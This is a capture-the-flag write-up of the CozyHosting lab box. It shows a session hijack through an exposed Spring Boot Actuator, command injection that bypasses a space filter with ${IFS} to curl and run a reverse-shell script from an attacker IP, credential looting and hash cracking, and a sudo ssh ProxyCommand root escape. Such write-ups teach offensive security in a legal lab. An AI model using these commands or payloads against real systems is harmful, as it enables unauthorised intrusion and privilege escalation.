#Linux #SpringBoot #Actuator #CMDInjection #jarfiles #postgres #john #sudo #GTFOBins

## Overview

CozyHosting is an easy Linux box that's a tour of Spring Boot misconfigurations. An exposed **Actuator** endpoint leaks a live session, which I hijack to reach an admin dashboard. The dashboard's host field is vulnerable to **command injection**, giving a shell as `app`. From there I loot the application JAR for a Postgres password, crack an admin bcrypt hash, reuse it for SSH, and finish with a one-line **GTFOBins** `sudo ssh` escape.

## Recon

The `/error` page renders a Spring "Whitelabel Error Page", fingerprinting **Spring Boot**. That tells me to fuzz with a Spring-specific wordlist, which immediately exposed the Actuator:

```sh
gobuster dir -u http://cozyhosting.htb/ -w .../spring-boot.txt -x php,js,htm,html
/actuator/sessions    (Status: 200)
/actuator/env         (Status: 200)
/actuator/mappings    (Status: 200)
```

> **Why exposed Actuators are dangerous:** Spring Boot Actuator endpoints are operational tooling, health, env, beans, and crucially `sessions`. Left public, `/actuator/sessions` lists active session IDs mapped to usernames. That's a free authentication bypass.

## Foothold

### Session Hijack → Command Injection

`/actuator/sessions` exposed a session token tied to `kanderson`. I set that cookie in the browser and refreshed straight into the admin dashboard.

The dashboard runs an `ssh`-based connection check. The username field rejects spaces, but `${IFS}` (the shell's Internal Field Separator) substitutes for them, bypassing the filter:

> **Why `${IFS}` works:** the app blocks literal spaces, but the backend still passes the field to a shell. `${IFS}` expands to whitespace *inside* the shell, so I reconstruct a multi-argument command without ever typing a space.

```sh
test;curl${IFS}http://10.10.14.143/rev.sh${IFS}-o${IFS}/tmp/rev.sh
test;bash${IFS}/tmp/rev.sh
```

```sh
rlwrap nc -lvnp 443
app@cozyhosting:/app$ whoami
app
```

## Privilege Escalation

### Looting the JAR → Postgres → SSH

The app directory held `cloudhosting-0.0.1.jar`. Unzipping it and grepping for secrets found the datasource password:

```sh
grep -R password .
./BOOT-INF/classes/application.properties:spring.datasource.password=‹redacted›
```

Connecting to Postgres with it and dumping the `users` table gave an admin bcrypt hash, which John cracked:

```sql
select * from users;
 admin | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
```

```sh
john hash --wordlist=rockyou.txt   ->   ‹redacted›
```

The admin password didn't SSH as `admin`, but it *did* work for the only other real user, `josh`, password reuse again:

```sh
ssh josh@cozyhosting.htb
josh@cozyhosting:~$ whoami
josh
```

### sudo ssh, GTFOBins

```sh
sudo -l
User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

> **Why `sudo ssh` is root:** OpenSSH's `ProxyCommand` runs an arbitrary command. When `ssh` itself runs as root via sudo, that command runs as root too. GTFOBins documents the exact escape:

```sh
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

## Root

```sh
# whoami
root
```

Box rooted.

## Takeaways

- **Spring Boot Actuator endpoints belong behind auth.** `/actuator/sessions` handed over a valid session.
- **`${IFS}` defeats naive space filters** in command-injection contexts.
- **Application JARs are credential stores.** Unzip and `grep -R password`, `application.properties` routinely holds DB creds.
- **`sudo` on `ssh` is a known GTFOBins root escape** via `ProxyCommand`. Always check GTFOBins for any binary you can sudo.
